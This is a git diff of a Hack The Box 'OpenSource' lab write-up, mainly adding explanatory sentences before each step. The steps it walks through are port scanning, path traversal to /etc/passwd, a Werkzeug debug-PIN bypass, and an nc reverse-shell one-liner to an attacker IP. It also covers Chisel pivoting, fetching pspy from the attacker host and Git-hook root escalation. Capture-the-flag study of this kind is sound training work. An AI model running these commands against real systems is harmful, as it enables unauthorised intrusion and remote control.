@@ -1,3 +1,4 @@
+
 # HTB - OpenSource
 
 **IP Address:** `10.10.11.164`  
@@ -37,6 +38,9 @@ Privilege escalation is performed by abusing **Git hooks** executed as root via 
 
 ### 1.1 Connectivity Test
 
+Check if the host is alive using ICMP:
+
+
 ```bash
 ping -c 1 10.10.11.164
 ```
@@ -44,6 +48,9 @@ ping -c 1 10.10.11.164
 ![ping](screenshots/ping.png)
 
 ### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG allPorts
@@ -68,6 +75,9 @@ extractPorts allPorts
 
 ### 1.3 Targeted Scan
 
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
 ```bash
 nmap -p22,80 -sC -sV 10.10.11.164 -oN targeted
 ```
@@ -90,9 +100,12 @@ We can sheck the OpenSSH version in Launchpad:
 
 
 ---
-## 2. Web Enumeration
+## 2. Service Enumeration
 
 ### 2.1 Technology Fingerprinting
+
+Continue the attack chain with the next commands:
+
 
 ```bash
 whatweb http://10.10.11.164
@@ -103,6 +116,12 @@ whatweb http://10.10.11.164
 The service appears to be running on **Python Flask**.
 
 ### 2.2 Exploring the Website
+
+Load the main application in the browser and map primary features:
+
+```bash
+curl -i http://10.10.11.164/
+```
 
 ![web](screenshots/web.png)
 
@@ -156,7 +175,7 @@ curl http://10.10.11.164/uploads/..//etc/passwd --path-as-is
 ![curl_etc_passwd](screenshots/curl_etc_passwd.png)
 
 ---
-## 3. Exploitation
+## 3. Foothold
 
 ### 3.1 Werkzeug Console PIN Generation
 
@@ -189,9 +208,14 @@ PIN generated successfully:
 Access granted to console:
 
 ![web_console_login](screenshots/web_console_login.png)
+
+Continue the attack chain with the next commands:
+
 ![web_console_whoami](screenshots/web_console_whoami.png)
 
 ### 3.2 Remote Shell
+
+Spawn a reverse shell from the Werkzeug debug console using a one-liner **Python** `os.popen` payload:
 
 ```bash
 os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443").read().strip()
@@ -203,10 +227,7 @@ Gained shell inside **Docker container**:
 
 ![container](screenshots/container.png)
 
----
-## 4. Foothold
-
-### 4.1 Investigating Git Repository
+### 3.3 Investigating Git Repository
 
 Logs in the downloaded source:
 
@@ -225,7 +246,9 @@ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
 Credentials found:  
 `dev01:Soulless_Developer#2022`
 
-### 4.2 Port Discovery from Container
+### 3.4 Port Discovery from Container
+
+Map listening ports from inside the container and reach the internal service:
 
 ```bash
 nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164
@@ -244,7 +267,9 @@ wget http://172.17.0.1:3000/ -qO-
 ![container_ip](screenshots/container_ip.png)
 ![gitea](screenshots/gitea.png)
 
-### 4.3 Remote Port Forwarding with Chisel
+### 3.5 Remote Port Forwarding with Chisel
+
+Expose the internal Gitea instance by staging **Chisel** on both sides and forwarding **TCP 3000** from the container network to your attacker host:
 
 ```bash
 gunzip chisel.gz
@@ -285,9 +310,11 @@ SSH access as `dev01`:
 ✅ User flag obtained
 
 ---
-## 5. Privilege Escalation
+## 4. Privilege Escalation
 
-### 5.1 Process Monitoring with pspy
+### 4.1 Process Monitoring with pspy
+
+Watch for short-lived root processes by running **pspy** on the host and correlating activity with repository sync jobs:
 
 ```bash
 wget http://10.10.14.10:8000/pspy64
@@ -300,7 +327,7 @@ chmod +x pspy64
 
 A cron-executed script performs `git commit` as **root**.
 
-### 5.2 Abusing Git Hooks
+### 4.2 Abusing Git Hooks
 
 Inspecting hooks:
 
